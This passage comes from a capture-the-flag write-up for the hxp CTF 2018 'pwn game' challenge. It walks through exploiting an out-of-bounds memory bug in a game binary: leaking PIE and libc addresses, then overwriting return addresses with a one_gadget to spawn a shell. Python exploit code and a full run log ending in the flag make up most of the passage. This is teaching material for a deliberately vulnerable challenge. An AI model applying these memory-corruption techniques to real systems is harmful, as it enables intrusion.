+<p>So, there’s the <code class="language-plaintext highlighter-rouge">return address</code> of <code class="language-plaintext highlighter-rouge">main_loop</code> at <code class="language-plaintext highlighter-rouge">0x7fffffffe528</code>, which we can use for leaking <code class="language-plaintext highlighter-rouge">PIE</code> and calculating the real base address. And we have a nice (stable) libc address at <code class="language-plaintext highlighter-rouge">0x7fffffffe4a8</code> (<code class="language-plaintext highlighter-rouge">_IO_file_jumps</code>), with which we can calculate libc base.</p>
+
+<p>One catch though, we can only move upwards… Thus after reading those two addresses, we’d ultimately fail, since we only have 1 life left and it will be game over, if the monster hits us another time.</p>
+
+<p>Easy way out… While leaking the <code class="language-plaintext highlighter-rouge">main_loop return address</code>, modify it also and let it point back to <code class="language-plaintext highlighter-rouge">call main_loop</code> :</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ x/10i 0x00005555555565db
+0x5555555565db &lt;main+299&gt;: call   0x5555555560c0 &lt;main_loop&gt;
+0x5555555565e0 &lt;main+304&gt;: mov    QWORD PTR [rbp-0x828],rax</code></pre></figure>
+
+<p>Since the call is extremely near to the current return address, we can just fix it by reducing the cell value at <code class="language-plaintext highlighter-rouge">0x7fffffffe528</code> 5 times. If we quit the game after that, it will just call <code class="language-plaintext highlighter-rouge">main_loop</code> again, giving us another try :)</p>
+
+<p>So, let’s do the leaking part</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="s">"""
+Parse address at current position.
+"""</span>
+<span class="k">def</span> <span class="nf">parse_qword</span><span class="p">():</span>
+  <span class="n">r1</span> <span class="o">=</span> <span class="s">""</span>
+  
+  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+    <span class="n">parse_screen</span><span class="p">()</span>
+    <span class="n">r1</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">CURRENT</span><span class="p">)</span>    
+    <span class="n">move</span><span class="p">(</span><span class="s">"d"</span><span class="p">)</span>
+
+  <span class="n">parse_screen</span><span class="p">()</span>
+  <span class="k">return</span> <span class="n">u64</span><span class="p">(</span><span class="n">r1</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+
+<span class="s">"""
+Read value at specific address.
+"""</span>
+<span class="k">def</span> <span class="nf">read_address</span><span class="p">(</span><span class="n">address</span><span class="p">):</span>
+  <span class="n">goto_address</span><span class="p">(</span><span class="n">address</span><span class="p">)</span> 
+  <span class="k">return</span> <span class="n">parse_qword</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+  <span class="p">...</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak PIE"</span><span class="p">)</span>
+
+  <span class="n">PIELEAK</span> <span class="o">=</span> <span class="n">read_address</span><span class="p">(</span><span class="mh">0x7fffffffe528</span><span class="p">)</span>
+  <span class="n">e</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">PIELEAK</span> <span class="o">-</span> <span class="mh">0x25e0</span>
+  
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"PIE leak          : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PIELEAK</span><span class="p">))</span>
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"PIE base          : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>
+
+  <span class="p">...</span></code></pre></figure>
+
+<p>Just moving the player to the appropriate offset and then read byte per byte by parsing the game screen and reading <code class="language-plaintext highlighter-rouge">current cell value</code>.</p>
+
+<p>While we’re at that address, we can fix up the return address, by just decrementing the LSB of the return address 5 times. I’ll skip that part for now, since the following writes will be more complicated, but we can reuse that functionality also to do this overwrite.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overwrite main_loop ret for another round"</span><span class="p">)</span>
+<span class="n">change_address</span><span class="p">(</span><span class="mh">0x7fffffffe528</span><span class="p">,</span> <span class="n">PIELEAK</span><span class="p">,</span> <span class="n">PIELEAK</span><span class="o">-</span><span class="mi">5</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak libc"</span><span class="p">)</span>
+
+<span class="n">LIBCLEAK</span> <span class="o">=</span> <span class="n">read_address</span><span class="p">(</span><span class="mh">0x7fffffffe4a8</span><span class="p">)</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">LIBCLEAK</span> <span class="o">-</span> <span class="mh">0x396440</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC leak         : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBCLEAK</span><span class="p">))</span></code></pre></figure>
+
+<p>By now, we have the <code class="language-plaintext highlighter-rouge">PIE</code> and <code class="language-plaintext highlighter-rouge">LIBC</code> leak and have overwritten <code class="language-plaintext highlighter-rouge">main_loop</code> return address to just call <code class="language-plaintext highlighter-rouge">main_loop</code> again. Since we cannot do anything useful anymore in the current game state, we’ll just quit the current game, triggering <code class="language-plaintext highlighter-rouge">main_loop</code> again with a clean game state.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Quit to return to initial state"</span><span class="p">)</span>
+  
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"q"</span><span class="p">)</span>
+<span class="n">parse_screen</span><span class="p">()</span>
+<span class="n">init_exploit_state</span><span class="p">()</span></code></pre></figure>
+
+<p>Ok, we’re back in our initial <code class="language-plaintext highlighter-rouge">oob</code> position, but this time, we know some leaks. Though we can loop the game by making small modifications to the <code class="language-plaintext highlighter-rouge">main_loop</code> return address, we won’t be able to do a complete libc address write. The monster will just catch up, while we’re at it, resulting in a game over or segfault…</p>
+
+<p>But since we can always do the loop overwrite to continue playing after quitting, we can target the return address of <code class="language-plaintext highlighter-rouge">main</code> instead and keep replaying, until we have successfully written a complete arbitrary address to it, and then quit the game completely.</p>
+
+<p>The end of main is also a good target since <code class="language-plaintext highlighter-rouge">rax</code> will be <code class="language-plaintext highlighter-rouge">0x0</code> at that point, which will fulfill this <code class="language-plaintext highlighter-rouge">one_gadget</code>:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x3f306 execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  rax == NULL</code></pre></figure>
+
+<p>At this point, modifying the libc address will get a little bite more complicated, since we need to do so many increases/decreases, that the monster will definitely catch up.</p>
+
+<p>It was around 02:00 AM, when I went haywire because of this and started a huge copy/paste mess, modifying a byte, overwriting main loop, running back to the current address on and on and on. It looked really awful (though it ultimately worked and spit out the flag).</p>
+
+<p>Let’s try to improve it a bit this time:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+  <span class="p">...</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Play until main return address is overwritten with one_gadget"</span><span class="p">)</span>
+
+  <span class="n">CURRENT_MAIN_RET</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x202e1</span>
+  <span class="n">ONE_GADGET</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x3f306</span>
+
+  <span class="n">change_address</span><span class="p">(</span><span class="mh">0x7fffffffed78</span><span class="p">,</span> <span class="n">CURRENT_MAIN_RET</span><span class="p">,</span> <span class="n">ONE_GADGET</span><span class="p">)</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Main return address successfully overwritten. Quit to trigger shell..."</span><span class="p">)</span>
+
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"q"</span><span class="p">)</span>
+
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"EXIT!</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>
+
+<p>Since we have the leaks, we know the current value of the return address, and we also know the value, we would like to have it instead. Thus it’s just a matter of walking to <code class="language-plaintext highlighter-rouge">main</code> return address, modifying its bytes, until the monster gets too close.</p>
+
+<p>We’ll then <em>run</em> away to <code class="language-plaintext highlighter-rouge">main_loop</code> return address, modify it back to <code class="language-plaintext highlighter-rouge">call main_loop</code> and quit, which will save us from getting caught :)</p>
+
+<p>Get back into initial exploit stage… Rinse and repeat until <code class="language-plaintext highlighter-rouge">main</code> return address matches our desired address.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="s">"""
+Change value of current cell.
+"""</span>
+<span class="k">def</span> <span class="nf">change_value</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>  
+  <span class="k">if</span> <span class="n">value</span> <span class="o">==</span> <span class="o">-</span><span class="mh">0x10</span><span class="p">:</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+  <span class="k">elif</span> <span class="n">value</span> <span class="o">==</span> <span class="mh">0x10</span><span class="p">:</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+  <span class="k">elif</span> <span class="n">value</span> <span class="o">==</span> <span class="o">-</span><span class="mh">0x1</span><span class="p">:</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"-"</span><span class="p">)</span>
+  <span class="k">elif</span> <span class="n">value</span> <span class="o">==</span> <span class="mh">0x1</span><span class="p">:</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"+"</span><span class="p">)</span>
+
+  <span class="n">move_enemy</span><span class="p">()</span>
+
+<span class="s">"""
+Change specified address from source value to destination value.
+This will observe monster position and if the monster comes near
+it will cancel current write and restart the game. On restart it
+will walk back to the current address and continue the overwrite
+until the destination value was completely written.
+"""</span>
+<span class="k">def</span> <span class="nf">change_address</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">src_value</span><span class="p">,</span> <span class="n">dest_value</span><span class="p">):</span>
+  <span class="k">global</span> <span class="n">ENEMY_DISTANCE</span><span class="p">,</span> <span class="n">PIELEAK</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Change address %s : %s =&gt; %s"</span> <span class="o">%</span> <span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">address</span><span class="p">),</span> <span class="nb">hex</span><span class="p">(</span><span class="n">src_value</span><span class="p">),</span> <span class="nb">hex</span><span class="p">(</span><span class="n">dest_value</span><span class="p">)))</span>
+
+  <span class="n">goto_address</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
+
+  <span class="n">cur_offset</span> <span class="o">=</span> <span class="mi">0</span>
+
+  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+    <span class="n">cur_byte</span> <span class="o">=</span> <span class="p">(</span><span class="n">src_value</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
+    <span class="n">dest_byte</span> <span class="o">=</span> <span class="p">(</span><span class="n">dest_value</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
+
+    <span class="c1"># only move if we have something to do for this byte
+</span>    <span class="k">if</span> <span class="n">cur_byte</span> <span class="o">!=</span> <span class="n">dest_byte</span><span class="p">:</span>     
+      <span class="k">while</span> <span class="n">cur_offset</span> <span class="o">&lt;</span> <span class="n">i</span><span class="p">:</span>
+        <span class="n">move</span><span class="p">(</span><span class="s">"d"</span><span class="p">)</span> 
+        <span class="n">cur_offset</span> <span class="o">+=</span> <span class="mi">1</span>
+    
+    <span class="k">while</span> <span class="n">cur_byte</span> <span class="o">!=</span> <span class="n">dest_byte</span><span class="p">:</span>  
+      <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Change byte at %s : %s =&gt; %s"</span> <span class="o">%</span> <span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">address</span><span class="o">+</span><span class="n">cur_offset</span><span class="p">),</span> <span class="nb">hex</span><span class="p">(</span><span class="n">cur_byte</span><span class="p">),</span> <span class="nb">hex</span><span class="p">(</span><span class="n">dest_byte</span><span class="p">)))</span>
+
+      <span class="c1"># try to modify the current byte until monster gets too close
+</span>      <span class="k">while</span> <span class="p">(</span><span class="n">cur_byte</span> <span class="o">&gt;=</span> <span class="n">dest_byte</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">ENEMY_DISTANCE</span> <span class="o">&gt;</span> <span class="mi">3</span><span class="p">):</span>
+        <span class="n">change_value</span><span class="p">(</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span>
+        <span class="n">cur_byte</span> <span class="o">-=</span> <span class="mh">0x10</span>
+      <span class="k">while</span> <span class="p">(</span><span class="n">cur_byte</span> <span class="o">&gt;</span> <span class="n">dest_byte</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">ENEMY_DISTANCE</span> <span class="o">&gt;</span> <span class="mi">3</span><span class="p">):</span>
+        <span class="n">change_value</span><span class="p">(</span><span class="o">-</span><span class="mh">0x1</span><span class="p">)</span>
+        <span class="n">cur_byte</span> <span class="o">-=</span> <span class="mh">0x1</span>
+      <span class="k">while</span> <span class="p">(</span><span class="n">cur_byte</span> <span class="o">&lt;=</span> <span class="n">dest_byte</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">ENEMY_DISTANCE</span> <span class="o">&gt;</span> <span class="mi">3</span><span class="p">):</span>
+        <span class="n">change_value</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
+        <span class="n">cur_byte</span> <span class="o">+=</span> <span class="mh">0x10</span>
+      <span class="k">while</span> <span class="p">(</span><span class="n">cur_byte</span> <span class="o">&lt;</span> <span class="n">dest_byte</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">ENEMY_DISTANCE</span> <span class="o">&gt;</span> <span class="mi">3</span><span class="p">):</span>
+        <span class="n">change_value</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span>
+        <span class="n">cur_byte</span> <span class="o">+=</span> <span class="mh">0x1</span>
+
+      <span class="n">parse_screen</span><span class="p">()</span>
+
+      <span class="c1"># check, if we had to cancel because of monster getting close
+</span>      <span class="k">if</span> <span class="n">cur_byte</span> <span class="o">!=</span> <span class="n">dest_byte</span><span class="p">:</span>
+        <span class="c1"># overwrite main_loop return with call to main_loop and quit
+</span>        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Cancel address write and replay"</span><span class="p">)</span>
+
+        <span class="n">change_address</span><span class="p">(</span><span class="mh">0x7fffffffe528</span><span class="p">,</span> <span class="n">PIELEAK</span><span class="p">,</span> <span class="n">PIELEAK</span><span class="o">-</span><span class="mi">5</span><span class="p">)</span>
+
+        <span class="c1"># quit and replay until we reach current address again and continue with overwrite
+</span>        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"q"</span><span class="p">)</span>
+        <span class="n">parse_screen</span><span class="p">()</span>
+        <span class="n">init_exploit_state</span><span class="p">()</span>
+
+        <span class="n">goto_address</span><span class="p">(</span><span class="n">address</span><span class="o">+</span><span class="n">cur_offset</span><span class="p">)</span></code></pre></figure>
+
+<p>And there we are, <code class="language-plaintext highlighter-rouge">main</code> return address should now nicely point to <code class="language-plaintext highlighter-rouge">one_gadget</code> and all that’s left to do for us, is to quit without modifying <code class="language-plaintext highlighter-rouge">main_loop</code> return address, so it will jump back into <code class="language-plaintext highlighter-rouge">main</code> again, which will finally trigger a shell.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 1
+[*] '/ctf/hxp/game/pwn game/challenge'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] '/ctf/hxp/game/pwn game/libc-2.24.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to 195.201.127.177 on port 9999: Done
+[*] PLAYER_X: 5 / PLAYER_Y: 5 / ENEMY_X: 0 / ENEMY_Y: 0 / ENEMY_DISTANCE: 0 / Cur: 0x53 / Dest: 0x50
+[*] Starting game, go out of bounds
+[*] PLAYER_X: 9 / PLAYER_Y: 254 / ENEMY_X: 9 / ENEMY_Y: 255 / ENEMY_DISTANCE: 9 / Cur: 0x0 / Dest: 0x0
+[*] Leak PIE
+[*] Goto address 0x7fffffffe528 : 2 / 23
+[*] PLAYER_X: 2 / PLAYER_Y: 23 / ENEMY_X: 5 / ENEMY_Y: 137 / ENEMY_DISTANCE: 115 / Cur: 0xe0 / Dest: 0x1
+[*] PLAYER_X: 3 / PLAYER_Y: 23 / ENEMY_X: 4 / ENEMY_Y: 136 / ENEMY_DISTANCE: 114 / Cur: 0x65 / Dest: 0x0
+[*] PLAYER_X: 4 / PLAYER_Y: 23 / ENEMY_X: 3 / ENEMY_Y: 135 / ENEMY_DISTANCE: 113 / Cur: 0xaa / Dest: 0x0
+[*] PLAYER_X: 5 / PLAYER_Y: 23 / ENEMY_X: 4 / ENEMY_Y: 134 / ENEMY_DISTANCE: 112 / Cur: 0xaa / Dest: 0x0
+[*] PLAYER_X: 6 / PLAYER_Y: 23 / ENEMY_X: 4 / ENEMY_Y: 134 / ENEMY_DISTANCE: 112 / Cur: 0xb7 / Dest: 0x5
+[*] PLAYER_X: 7 / PLAYER_Y: 23 / ENEMY_X: 4 / ENEMY_Y: 134 / ENEMY_DISTANCE: 112 / Cur: 0x55 / Dest: 0x0
+[*] PLAYER_X: 8 / PLAYER_Y: 23 / ENEMY_X: 4 / ENEMY_Y: 134 / ENEMY_DISTANCE: 112 / Cur: 0x0 / Dest: 0x0
+[*] PIE leak          : 0x55b7aaaa65e0
+[*] PIE base          : 0x55b7aaaa4000
+[*] Overwrite main_loop ret for another round
+[*] Change address 0x7fffffffe528 : 0x55b7aaaa65e0 =&gt; 0x55b7aaaa65db
+[*] Goto address 0x7fffffffe528 : 2 / 23
+[*] Change byte at 0x7fffffffe528 : 0xe0 =&gt; 0xdb
+[*] PLAYER_X: 2 / PLAYER_Y: 23 / ENEMY_X: 2 / ENEMY_Y: 128 / ENEMY_DISTANCE: 106 / Cur: 0xdb / Dest: 0x1
+[*] Leak libc
+[*] Goto address 0x7fffffffe4a8 : 4 / 10
+[*] PLAYER_X: 4 / PLAYER_Y: 10 / ENEMY_X: 4 / ENEMY_Y: 120 / ENEMY_DISTANCE: 111 / Cur: 0x40 / Dest: 0x0
+[*] PLAYER_X: 5 / PLAYER_Y: 10 / ENEMY_X: 5 / ENEMY_Y: 119 / ENEMY_DISTANCE: 110 / Cur: 0xc4 / Dest: 0x9f
+[*] PLAYER_X: 6 / PLAYER_Y: 10 / ENEMY_X: 5 / ENEMY_Y: 119 / ENEMY_DISTANCE: 110 / Cur: 0xb5 / Dest: 0xb0
+[*] PLAYER_X: 7 / PLAYER_Y: 10 / ENEMY_X: 5 / ENEMY_Y: 119 / ENEMY_DISTANCE: 110 / Cur: 0x8 / Dest: 0x4d
+[*] PLAYER_X: 8 / PLAYER_Y: 10 / ENEMY_X: 5 / ENEMY_Y: 119 / ENEMY_DISTANCE: 110 / Cur: 0xa4 / Dest: 0xfc
+[*] PLAYER_X: 9 / PLAYER_Y: 10 / ENEMY_X: 6 / ENEMY_Y: 118 / ENEMY_DISTANCE: 109 / Cur: 0x7f / Dest: 0xba
+[*] PLAYER_X: 9 / PLAYER_Y: 10 / ENEMY_X: 7 / ENEMY_Y: 117 / ENEMY_DISTANCE: 108 / Cur: 0x7f / Dest: 0xba
+[*] LIBC leak         : 0x7fa408b5c440
+[*] Quit to return to initial state
+[*] PLAYER_X: 5 / PLAYER_Y: 5 / ENEMY_X: 7 / ENEMY_Y: 117 / ENEMY_DISTANCE: 108 / Cur: 0x53 / Dest: 0x50
+[*] Starting game, go out of bounds
+[*] PLAYER_X: 9 / PLAYER_Y: 254 / ENEMY_X: 9 / ENEMY_Y: 255 / ENEMY_DISTANCE: 114 / Cur: 0x0 / Dest: 0x0
+[*] Play until main return address is overwritten with one_gadget
+[*] Change address 0x7fffffffed78 : 0x7fa4087e62e1 =&gt; 0x7fa408805306
+[*] Goto address 0x7fffffffed78 : 0 / 236
+[*] Change byte at 0x7fffffffed78 : 0xe1 =&gt; 0x6
+[*] PLAYER_X: 0 / PLAYER_Y: 236 / ENEMY_X: -1 / ENEMY_Y: 237 / ENEMY_DISTANCE: 2 / Cur: 0x51 / Dest: 0x0
+[*] Cancel address write and replay
+[*] Change address 0x7fffffffe528 : 0x55b7aaaa65e0 =&gt; 0x55b7aaaa65db
+[*] Goto address 0x7fffffffe528 : 2 / 23
+[*] Change byte at 0x7fffffffe528 : 0xe0 =&gt; 0xdb
+[*] PLAYER_X: 2 / PLAYER_Y: 23 / ENEMY_X: 1 / ENEMY_Y: 127 / ENEMY_DISTANCE: 105 / Cur: 0xdb / Dest: 0x1
+[*] PLAYER_X: 5 / PLAYER_Y: 5 / ENEMY_X: 1 / ENEMY_Y: 127 / ENEMY_DISTANCE: 105 / Cur: 0x53 / Dest: 0x50
+[*] Starting game, go out of bounds
+[*] PLAYER_X: 9 / PLAYER_Y: 254 / ENEMY_X: 9 / ENEMY_Y: 255 / ENEMY_DISTANCE: 122 / Cur: 0x0 / Dest: 0x0
+[*] Goto address 0x7fffffffed78 : 0 / 236
+[*] Change byte at 0x7fffffffed78 : 0x51 =&gt; 0x6
+[*] PLAYER_X: 0 / PLAYER_Y: 236 / ENEMY_X: -1 / ENEMY_Y: 237 / ENEMY_DISTANCE: 2 / Cur: 0xd / Dest: 0x0
+[*] Cancel address write and replay
+[*] Change address 0x7fffffffe528 : 0x55b7aaaa65e0 =&gt; 0x55b7aaaa65db
+[*] Goto address 0x7fffffffe528 : 2 / 23
+[*] Change byte at 0x7fffffffe528 : 0xe0 =&gt; 0xdb
+[*] PLAYER_X: 2 / PLAYER_Y: 23 / ENEMY_X: 2 / ENEMY_Y: 128 / ENEMY_DISTANCE: 106 / Cur: 0xdb / Dest: 0x54
+[*] PLAYER_X: 5 / PLAYER_Y: 5 / ENEMY_X: 2 / ENEMY_Y: 128 / ENEMY_DISTANCE: 106 / Cur: 0x53 / Dest: 0x50
+[*] Starting game, go out of bounds
+[*] PLAYER_X: 9 / PLAYER_Y: 254 / ENEMY_X: 9 / ENEMY_Y: 255 / ENEMY_DISTANCE: 122 / Cur: 0x0 / Dest: 0x0
+[*] Goto address 0x7fffffffed78 : 0 / 236
+[*] Change byte at 0x7fffffffed78 : 0xd =&gt; 0x6
+[*] PLAYER_X: 0 / PLAYER_Y: 236 / ENEMY_X: -1 / ENEMY_Y: 237 / ENEMY_DISTANCE: 2 / Cur: 0x7 / Dest: 0x0
+[*] Cancel address write and replay
+[*] Change address 0x7fffffffe528 : 0x55b7aaaa65e0 =&gt; 0x55b7aaaa65db
+[*] Goto address 0x7fffffffe528 : 2 / 23
+[*] Change byte at 0x7fffffffe528 : 0xe0 =&gt; 0xdb
+[*] PLAYER_X: 2 / PLAYER_Y: 23 / ENEMY_X: 2 / ENEMY_Y: 128 / ENEMY_DISTANCE: 106 / Cur: 0xdb / Dest: 0x45
+[*] PLAYER_X: 5 / PLAYER_Y: 5 / ENEMY_X: 2 / ENEMY_Y: 128 / ENEMY_DISTANCE: 106 / Cur: 0x53 / Dest: 0x50
+[*] Starting game, go out of bounds
+[*] PLAYER_X: 9 / PLAYER_Y: 254 / ENEMY_X: 9 / ENEMY_Y: 255 / ENEMY_DISTANCE: 122 / Cur: 0x0 / Dest: 0x0
+[*] Goto address 0x7fffffffed78 : 0 / 236
+[*] Change byte at 0x7fffffffed78 : 0x7 =&gt; 0x6
+[*] PLAYER_X: 0 / PLAYER_Y: 236 / ENEMY_X: 2 / ENEMY_Y: 240 / ENEMY_DISTANCE: 5 / Cur: 0x6 / Dest: 0x0
+[*] Change byte at 0x7fffffffed79 : 0x62 =&gt; 0x53
+[*] PLAYER_X: 1 / PLAYER_Y: 236 / ENEMY_X: 0 / ENEMY_Y: 238 / ENEMY_DISTANCE: 3 / Cur: 0x5f / Dest: 0x0
+[*] Cancel address write and replay
+[*] Change address 0x7fffffffe528 : 0x55b7aaaa65e0 =&gt; 0x55b7aaaa65db
+[*] Goto address 0x7fffffffe528 : 2 / 23
+[*] Change byte at 0x7fffffffe528 : 0xe0 =&gt; 0xdb
+[*] PLAYER_X: 2 / PLAYER_Y: 23 / ENEMY_X: 1 / ENEMY_Y: 129 / ENEMY_DISTANCE: 107 / Cur: 0xdb / Dest: 0x45
+[*] PLAYER_X: 5 / PLAYER_Y: 5 / ENEMY_X: 1 / ENEMY_Y: 129 / ENEMY_DISTANCE: 107 / Cur: 0x53 / Dest: 0x50
+[*] Starting game, go out of bounds
+[*] PLAYER_X: 9 / PLAYER_Y: 254 / ENEMY_X: 9 / ENEMY_Y: 255 / ENEMY_DISTANCE: 124 / Cur: 0x0 / Dest: 0x0
+[*] Goto address 0x7fffffffed79 : 1 / 236
+[*] Change byte at 0x7fffffffed79 : 0x5f =&gt; 0x53
+[*] PLAYER_X: 1 / PLAYER_Y: 236 / ENEMY_X: 0 / ENEMY_Y: 238 / ENEMY_DISTANCE: 3 / Cur: 0x57 / Dest: 0x0
+[*] Cancel address write and replay
+[*] Change address 0x7fffffffe528 : 0x55b7aaaa65e0 =&gt; 0x55b7aaaa65db
+[*] Goto address 0x7fffffffe528 : 2 / 23
+[*] Change byte at 0x7fffffffe528 : 0xe0 =&gt; 0xdb
+[*] PLAYER_X: 2 / PLAYER_Y: 23 / ENEMY_X: 1 / ENEMY_Y: 129 / ENEMY_DISTANCE: 107 / Cur: 0xdb / Dest: 0x45
+[*] PLAYER_X: 5 / PLAYER_Y: 5 / ENEMY_X: 1 / ENEMY_Y: 129 / ENEMY_DISTANCE: 107 / Cur: 0x53 / Dest: 0x50
+[*] Starting game, go out of bounds
+[*] PLAYER_X: 9 / PLAYER_Y: 254 / ENEMY_X: 9 / ENEMY_Y: 255 / ENEMY_DISTANCE: 124 / Cur: 0x0 / Dest: 0x0
+[*] Goto address 0x7fffffffed79 : 1 / 236
+[*] Change byte at 0x7fffffffed79 : 0x57 =&gt; 0x53
+[*] PLAYER_X: 1 / PLAYER_Y: 236 / ENEMY_X: 2 / ENEMY_Y: 240 / ENEMY_DISTANCE: 5 / Cur: 0x53 / Dest: 0x0
+[*] Change byte at 0x7fffffffed7a : 0x7e =&gt; 0x80
+[*] PLAYER_X: 2 / PLAYER_Y: 236 / ENEMY_X: 1 / ENEMY_Y: 239 / ENEMY_DISTANCE: 4 / Cur: 0x80 / Dest: 0x0
+[*] Main return address successfully overwritten. Quit to trigger shell...
+[*] Switching to interactive mode
+
+$ cat flag.txt
+hxp{(X+1&lt;Y)!=(X&lt;Y-1)}</code></pre></figure>
+
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=hxp CTF 2018 - pwn game&amp;url=https://kileak.github.io/ctf/2018/hxp18-pwn_game/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2018/hxp18-pwn_game/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2018/hxp18-pwn_game';
+        var disqus_title = 'hxp CTF 2018 - pwn game';
+        var disqus_url = 'https://kileak.github.io/ctf/2018/hxp18-pwn_game';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
